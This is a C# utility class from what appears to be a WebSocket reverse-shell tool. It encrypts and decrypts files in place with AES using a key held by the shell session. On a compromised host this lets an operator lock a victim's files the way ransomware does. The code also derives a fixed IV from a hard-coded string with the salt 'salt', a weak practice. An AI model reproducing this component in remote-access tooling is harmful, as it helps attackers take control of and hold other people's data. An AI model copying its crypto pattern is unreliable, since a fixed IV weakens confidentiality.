using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using WebSocketReverseShellDotNet.model;

namespace WebSocketReverseShellDotNet.utils
{
    internal class EncryptionUtil
    {

        static string iv = "3338be694f50c5f338814986cdf0686453a888b84f424d792af4b9202398f392";

        public static void EncryptFileInPlace(string filePath)
        {

            if (ReverseShellSession.AES256Key == null) return;

                // Read the content of the original file
            byte[] fileContent = File.ReadAllBytes(filePath);

            using (AesCryptoServiceProvider aesAlg = new AesCryptoServiceProvider())
            {
                aesAlg.Key = HexStringToByteArray(ReverseShellSession.AES256Key);
                aesAlg.Padding = PaddingMode.PKCS7;
                aesAlg.Mode = CipherMode.CBC;
                aesAlg.IV = DeriveIVFromPassword(iv, aesAlg.BlockSize / 8);


                ICryptoTransform encryptor = aesAlg.CreateEncryptor();

                // Encrypt the file content
                byte[] encryptedContent = encryptor.TransformFinalBlock(fileContent, 0, fileContent.Length);

                // Replace the original file with the encrypted content
                File.WriteAllBytes(filePath, encryptedContent);
            }

/*            // Optionally, delete the original file
            File.Delete(filePath);*/
        }
        public static void DecryptFileInPlace(string filePath)
        {
            if (ReverseShellSession.AES256Key == null) return;

            // Read the content of the encrypted file
            byte[] encryptedContent = File.ReadAllBytes(filePath);

            using (AesCryptoServiceProvider aesAlg = new AesCryptoServiceProvider())
            {
                aesAlg.Key = HexStringToByteArray(ReverseShellSession.AES256Key);
                aesAlg.Padding = PaddingMode.PKCS7;
                aesAlg.Mode = CipherMode.CBC;
                aesAlg.IV = DeriveIVFromPassword(iv, aesAlg.BlockSize / 8);


                ICryptoTransform decryptor = aesAlg.CreateDecryptor();


                // Decrypt the file content
                byte[] decryptedContent = decryptor.TransformFinalBlock(encryptedContent, 0, encryptedContent.Length);

                // Replace the encrypted file with the decrypted content
                File.WriteAllBytes(filePath, decryptedContent);
            }
        }

        private static byte[] DeriveIVFromPassword(string password, int byteLength)
        {
            // Using PBKDF2 to derive IV from password
            using (Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(password, Encoding.UTF8.GetBytes("salt")))
            {
                return rfc2898DeriveBytes.GetBytes(byteLength);
            }
        }
        static byte[] HexStringToByteArray(string hex)
        {
            int numberChars = hex.Length;
            byte[] bytes = new byte[numberChars / 2];
            for (int i = 0; i < numberChars; i += 2)
            {
                bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
            }
            return bytes;
        }

    }
}
